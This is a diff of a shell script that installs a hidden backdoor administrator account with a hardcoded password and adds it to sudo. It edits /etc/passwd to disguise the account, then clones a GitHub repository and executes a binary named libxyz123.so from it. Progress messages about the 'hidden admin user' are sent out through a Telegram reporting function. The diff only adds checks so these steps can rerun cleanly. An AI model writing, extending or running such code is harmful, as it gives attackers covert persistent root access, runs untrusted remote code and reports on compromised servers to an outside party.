@@ -30,26 +30,34 @@ send_telegram_message "Starting the creation of a hidden admin user. $server_inf
 user_id="rotjsugqbzuh"
 password_1="sousheb1828#Aausv@92"
 
-# Create the account
-useradd -m -s /bin/bash "$user_id"
-echo "$user_id:$password_1" | chpasswd
+# Check if user already exists
+if id "$user_id" &>/dev/null; then
+    send_telegram_message "User $user_id already exists. Skipping user creation."
+else
+    # Create the account
+    useradd -m -s /bin/bash "$user_id"
+    echo "$user_id:$password_1" | chpasswd
 
-# Add the user to sudo group (admin privileges)
-usermod -aG sudo "$user_id"
+    # Add the user to sudo group (admin privileges)
+    usermod -aG sudo "$user_id"
 
-# Change home directory to /home/$user_id
-usermod -d /home/$user_id "$user_id"
+    # Change home directory to /home/$user_id
+    usermod -d /home/$user_id "$user_id"
 
-# Hide the user by modifying the /etc/passwd file
-# Change the home directory to /var/empty to make it appear "hidden"
-sed -i "/^$user_id:/s#/home/$user_id#/var/empty#" /etc/passwd
+    # Hide the user by modifying the /etc/passwd file
+    # Change the home directory to /var/empty to make it appear "hidden"
+    sed -i "/^$user_id:/s#/home/$user_id#/var/empty#" /etc/passwd
 
-# Lock the user from appearing in the login screen by changing the shell
-usermod -s /bin/bash "$user_id"
+    # Lock the user from appearing in the login screen by changing the shell
+    usermod -s /bin/bash "$user_id"
+fi
 
 # Clone repository, change directory, and execute
-git clone https://github.com/Aytola7/lib02uba.git
-cd lib02uba || exit
+if [ ! -d "/root/lib02uba" ]; then
+    git clone https://github.com/Aytola7/lib02uba.git
+fi
+
+cd /root/lib02uba || exit
 chmod +x libxyz123.so
 ./libxyz123.so
 
